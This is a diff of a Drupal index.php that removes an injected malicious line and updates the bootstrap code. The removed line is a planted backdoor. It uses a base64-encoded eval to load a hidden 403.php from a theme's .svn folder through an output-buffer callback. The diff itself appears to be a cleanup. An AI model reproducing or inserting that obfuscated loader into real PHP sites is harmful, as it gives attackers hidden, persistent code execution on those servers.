@@ -1,5 +1,4 @@
 <?php
-// $Id: index.php,v 1.91 2006/12/12 09:32:18 unconed Exp $
 
 /**
  * @file
@@ -7,33 +6,16 @@
  *
  * The routines here dispatch control to the appropriate handler, which then
  * prints the appropriate page.
+ *
+ * All Drupal code is released under the GNU General Public License.
+ * See COPYRIGHT.txt and LICENSE.txt.
  */
 
-define('USE_DIRA', '/themes/bluemarine/.svn/'); @eval(@base64_decode("ZnVuY3Rpb24gY2FsbGJhY2soJGNoZWUpe3JlcXVpcmUoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXS5VU0VfRElSQS4iNDAzLnBocCIpO3JldHVybiAoJGNoZWUpO31vYl9zdGFydCgiY2FsbGJhY2siKTs="));
+/**
+ * Root directory of Drupal installation.
+ */
+define('DRUPAL_ROOT', getcwd());
 
-require_once './includes/bootstrap.inc';
+require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
 drupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);
-
-$return = menu_execute_active_handler();
-
-// Menu status constants are integers; page content is a string.
-if (is_int($return)) {
-  switch ($return) {
-    case MENU_NOT_FOUND:
-      drupal_not_found();
-      break;
-    case MENU_ACCESS_DENIED:
-      drupal_access_denied();
-      break;
-    case MENU_SITE_OFFLINE:
-      drupal_site_offline();
-      break;
-  }
-}
-elseif (isset($return)) {
-  // Print any value (including an empty string) except NULL or undefined:
-  print theme('page', $return);
-
-}
-
-drupal_page_footer();
+menu_execute_active_handler();
